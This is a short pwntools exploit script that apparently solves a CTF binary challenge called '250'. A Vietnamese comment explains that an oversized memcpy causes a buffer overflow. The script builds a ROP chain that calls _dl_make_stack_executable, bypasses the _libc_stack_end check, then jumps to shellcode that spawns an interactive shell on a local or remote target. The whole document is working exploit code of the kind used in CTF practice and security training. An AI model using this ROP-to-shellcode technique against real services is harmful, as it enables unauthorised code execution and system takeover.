from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x8048986
b* 0x8048958
continue
'''.format(**locals())

#Binary filename
exe = './250'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

################################################################

p = start()

'''
bài này lỗi tại hàm printf thứ 2 do memcpy quá số lượng nên ta có 
lỗi bufferOverflow
- Để thực thi thành công thì t có hướng khai thác cho đoạn 
stack có execution và viết shellcode vào 
- Chương trình cho sẵn hàm make_stack_execu và việc chúng 
ta cần làm là cho hàm bypass các điều kiện 
- Điều kiện:
CMP ecx, _libc_stack_end
cần phải đc thỏa mãn
'''

jmp_esp = 0x080de2bb
pop_ecx = 0x80df1b9
call_make_stack_execu = 0x809a260
_dl_make_stack_excu = elf.sym['_dl_make_stack_executable_hook']
inc_dword_ecx = 0x80845f8
libc_stack_end = 0x80a0b05

payload = b"a" * 0x3a + p32(libc_stack_end - 0x18) + p32(pop_ecx)
payload += p32(_dl_make_stack_excu) + p32(inc_dword_ecx)
payload += p32(call_make_stack_execu) + p32(jmp_esp) + asm(shellcraft.sh())

p.sendlineafter(b"SSCTF[InPut Data Size]", str(0x100))
p.sendlineafter(b"SSCTF[YourData]", payload)


p.interactive()
